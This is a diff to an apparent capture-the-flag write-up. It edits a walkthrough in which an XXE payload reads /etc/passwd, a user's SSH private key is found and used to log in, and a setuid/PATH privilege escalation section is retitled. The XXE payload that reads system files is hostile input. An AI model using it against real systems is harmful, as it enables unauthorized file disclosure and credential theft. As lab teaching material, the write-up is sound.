@@ -76,7 +76,7 @@ xml=<!DOCTYPE+replace+[<!ENTITY+name+SYSTEM+'file%3a///etc/passwd'>+]>
 ```
 
 And it worked! Three users have bash on the system: root, joe, and barry.
-Previous information told me barry has an ssh key, so I looked in /home/barry and found it
+Previous information told me barry has an ssh key, so I looked in /home/barry/.ssh and found it
 
 ```
 -----BEGIN RSA PRIVATE KEY-----
@@ -125,12 +125,12 @@ This quickly cracked the credentials:
 
 ```
 chmod 600 key
-ssh barry@<ip> -i key
+ssh barry@$ip -i key
 ```
 
 After giving the key the correct permissions I logged into ssh with barry's private key. This gave me the first flag from Barry's home directory.
 
-## Privilege Escalation to joe - SETUID and PATH exploitation
+## Privilege Escalation to root - SETUID and PATH exploitation
 
 Looking for SETUID binaries:
 
